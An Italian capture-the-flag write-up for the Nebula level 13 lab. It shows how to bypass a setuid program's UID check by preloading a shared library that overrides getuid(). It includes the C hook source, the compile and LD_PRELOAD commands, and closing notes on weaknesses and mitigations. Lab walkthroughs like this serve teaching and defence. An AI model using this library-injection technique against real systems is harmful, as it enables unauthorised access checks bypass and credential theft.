# Nebula_13 - Iniezione locale

## Obiettivi della sfida
1. Recuperare la password dell'utente **flag13** agirando il controllo di sicurezza del programma `/home/flag13/flag13`
2. Autenticarsi come **flag13**
3. Eseguire `bin/getflag`

## Strategia di attacco
L'amministratore non è intenzionato a fornire la password e romperla risulta troppo difficile quindi bisogna passare a strategie alternative. Controlliamo i permessi di `/home/flag13/flag13`,  veniamo a sapere che il binario flag13 è di proprietà dell'utente **flag13** ed è eseguibile dagli utenti del gruppo **level13** inoltre ha il bit SETUID alzato.
### Cosa fare

### Commento di level13_safe.c
Il programma controlla se l'UID è diverso da 1000 allora stampa un messaggio di errore, altrimenti crea il token di autenticazione per l'utente **flag13** e lo stampa.
Le variabili di ambiente sfruttabili per questo attacco sono **LD_PRELOAD** e **LD_LIBRARY_PATH** esse possono influenzare il comportamento del **linker**.  
Dal manuale di LD_PRELOAD scopriamo che esso contiene una lista di **librerie condivise** esse vengono linkate prima di tutte le altre durante l'esecuzione e vengono usate per ridefinire dinamicamente alcune funzioni senza dover ricompilare i sorgenti.

## Come sfruttare le vulnerabilità
Possiamo usare la variabile LD_PRELOAD per caricare una libreria che implementa la funzione del controllo degli accessi del programma `/home/flag13/flag13`. La libreria che scriveremo reimposta `getuid()` per superare il controllo degli accessi.

### Istruzioni da eseguire
1. Scrivere la libreria **getuid.c**
```c
#include <unistd.h>
#include <sys/types.h>

uid_t getuid(void){
    return 1000;
}
```
2. Generare la libreria condivisa con:
```bash
> gcc -shared -fPIC -o getuid.so getuid.c
```
3. Caricare la libreria
```bash
> LD_PRELOAD=./getuid.so
# esecuzione di flag13
/home/flag13/flag13
# fallimento
```
L'iniezione della libreria fallisce perchè il manuale di LD_PRELOAD ci dice che se l'eseguibile ha SETUID alzato allora lo deve tenere anche la libreria.  
Il SETUID della libreria non può essere modificato perchè non siamo root, ma possiamo abbassare il SETUID del binario facendone una copia.  
Quindi per vincere la sfida facciamo
```bash
> cp /home/flag13/flag13 /home/level13/flag13
> gcc -shared -fPIC -o getuid.so getuid.c
> LD_PRELOAD=./getuid.so /home/level13/flag13
> ./flag13
# stampa del token di autenticazione
# possiamo autenticarci come flag13 dato che abbiamo la password
> getflag
# sfida vinta
```

## Debolezze
1. Manipolando LD_PRELOAD riusciamo a sovrascrivere getuid()
2. by-pass tramite **spoofing**, l'attaccante può riprodurre il token di autenticazione di un altro utente.
## Mitigazione
1. Questa volta non possiamo semplicemente ripulire la variabile di ambiente perchè LD_PRELOAD agisce prima del caricamento del programma.
2. L'autenticazione si basa su un valore noto che è 1000, occorre utilizzare più fattori di autenticazione.